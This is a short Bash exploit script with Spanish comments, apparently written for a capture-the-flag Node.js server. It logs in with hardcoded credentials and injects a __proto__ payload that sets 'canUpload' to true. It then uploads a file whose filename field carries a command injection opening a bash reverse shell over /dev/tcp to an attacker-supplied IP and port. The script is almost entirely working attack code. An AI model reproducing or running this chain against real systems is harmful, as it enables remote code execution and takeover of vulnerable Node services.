#!/bin/bash

# Variables globales  -------------------------.
URL="$1"
IP="$2"
PORT="$3"

# Funciones -----------------------------------.
function ctrl_c() {  # Controlamos salida con Ctrl+C
    echo "s4l1eNdo..."
}
trap ctrl_c INT

function todo_data() {
    cat <<EOF
    {
        "auth": {
            "name": "felamos",
            "password": "Winter2021"
        },
        "filename": "todo.txt"
    }
EOF
}

function upload_data() {
    cat <<EOF
    {
        "auth": {
            "name": "felamos",
            "password": "Winter2021"
        },
        "filename": "& bash -c 'bash >& /dev/tcp/$1/$2 0>&1'"
    }
EOF
}

function message_data() {
    cat <<EOF
    {
        "auth": {
            "name": "felamos",
            "password": "Winter2021"
        },
        "message": {
            "text": "holadenuevorey",
            "__proto__": {
               "canUpload": "true"
            }
        }
    }
EOF
}

# Inicio del programa -------------------------.
if [ -z $URL ] || [ -z $IP ] || [ -z $PORT ]; then
    echo -e "Uso: $0 http://<node_server> <attacker_ip> <attacker_port>"
    echo -e "\nEjemplo:\n\t$0 http://10.10.10.235:31337 10.10.141.141 4433"
    exit 1
else
    # Asignamos objeto `canUpload`
    curl -s -H "Content-Type: application/json" -X PUT -d "$(message_data)" $URL > /dev/null

    # Subimos archivo con comando
    curl -s -H "Content-Type: application/json" -X POST -d "$(upload_data $IP $PORT)" $URL/upload > /dev/null
    echo -e "[+] Reverse Shell Generada, si no, valida tus argumentos!!"
fi
